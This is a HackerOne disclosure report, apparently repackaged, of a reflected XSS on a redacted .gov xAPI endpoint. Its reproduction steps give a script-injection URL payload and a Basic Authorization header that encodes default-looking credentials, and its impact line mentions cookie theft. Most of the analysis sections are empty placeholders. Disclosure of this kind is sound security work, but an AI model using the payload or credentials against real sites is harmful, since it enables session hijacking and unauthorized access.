# XSS on ( █████████.gov ) Via URL path

## Metadata
- **Source:** HackerOne
- **Report:** 1825942 | https://hackerone.com/reports/1825942
- **Submitted:** 2023-01-08
- **Reporter:** notajax
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** CVE-2021-41878
- **Category:** web-api

## Summary
Hi team,
I was able to execute XSS on  ███████.gov  

Steps to produce - 
1 -Turn on the burp intercepter 
2- Go to  https://██████.gov/xapi/statements?file"><script>alert(document.domain)</script>
3-  In  Intercepter add the following Headers 

  Authorization: Basic eGFwaS10b29sczp4YXBpLXRvb2xz
   X-Experience-Api-Version: 1.0.1

4-  when you send this GET request you will receive a response wit

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi team,
I was able to execute XSS on  ███████.gov  

Steps to produce - 
1 -Turn on the burp intercepter 
2- Go to  https://██████.gov/xapi/statements?file"><script>alert(document.domain)</script>
3-  In  Intercepter add the following Headers 

  Authorization: Basic eGFwaS10b29sczp4YXBpLXRvb2xz
   X-Experience-Api-Version: 1.0.1

4-  when you send this GET request you will receive a response with XSS payload executed.

## Impact

An attacker can send the malicious link to victims and steals victims' cookie leading to account takeover.

## System Host(s)
www.███.gov

## Affected Product(s) and Version(s)


## CVE Numbers
CVE-2021-41878

## Steps to Reproduce
I have attached the Video POC, please check it out.

## Suggested Mitigation/Remediation Actions
sanitize the inputs in the URL



</details>

---
*Analysed by Claude on 2026-05-24*
